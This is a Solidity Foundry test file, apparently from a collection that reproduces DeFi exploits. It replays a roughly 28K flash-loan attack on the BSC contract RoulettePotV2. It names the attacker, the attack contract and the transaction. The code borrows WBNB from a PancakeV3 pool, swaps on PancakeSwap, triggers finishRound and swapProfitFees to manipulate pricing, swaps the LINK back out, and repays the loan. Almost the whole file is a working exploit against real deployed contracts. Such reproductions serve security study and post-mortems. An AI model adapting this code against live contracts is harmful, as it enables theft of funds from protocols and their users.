// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~28K
// Attacker : https://bscscan.com/address/0x0000000000004f3d8aaf9175fd824cb00ad4bf80
// Attack Contract : https://bscscan.com/address/0x000000000000bb1b11e5ac8099e92e366b64c133
// Vulnerable Contract : https://bscscan.com/address/0xf573748637e0576387289f1914627d716927f90f
// Attack Tx : https://bscscan.com/tx/0xd9e0014a32d96cfc8b72864988a6e1664a9b6a2e90aeaa895fcd42da11cc3490

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xf573748637e0576387289f1914627d716927f90f#code

// @Analysis
// Post-mortem : 
// Twitter Guy : https://x.com/TenArmorAlert/status/1878008055717376068
// Hacking God : 
pragma solidity ^0.8.0;

import "../interface.sol";

interface IRoulettePotV2 {
    function finishRound() external;
    function swapProfitFees() external;
}

contract RoulettePotV2 is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 45_668_285;
    address internal constant PancakeV3Pool = 0x172fcD41E0913e95784454622d1c3724f546f849;
    address internal constant PancakeSwap = 0x824eb9faDFb377394430d2744fa7C42916DE3eCe;
    address internal constant RoulettePotV2 = 0xf573748637E0576387289f1914627d716927F90f;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant LINK = 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(WBNB);
    }

    function testExploit() public balanceLog {
        address recipient = PancakeSwap;
        uint256 amount0 = 0;
        uint256 amount1 = 4_203_732_130_200_000_000_000;
        bytes memory data = abi.encode(amount1);
        IPancakeV3Pool(PancakeV3Pool).flash(recipient, amount0, amount1, data);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory data) external {
        uint256 amount = abi.decode(data, (uint256));

        uint256 amount0Out = 0;
        uint256 amount1Out = 17_527_795_283_271_427_200_665;
        address to = address(this);
        IUniswapV2Pair(PancakeSwap).swap(amount0Out, amount1Out, to, new bytes(0));

        IRoulettePotV2(RoulettePotV2).finishRound();

        IRoulettePotV2(RoulettePotV2).swapProfitFees();

        uint256 balance = IERC20(LINK).balanceOf(address(this));
        IERC20(LINK).transfer(PancakeSwap, balance);

        amount0Out = 4_243_674_096_928_729_821_513;
        amount1Out = 0;
        IUniswapV2Pair(PancakeSwap).swap(amount0Out, amount1Out, to, new bytes(0));

        IERC20(WBNB).transfer(PancakeV3Pool, amount+fee1);
    }
}
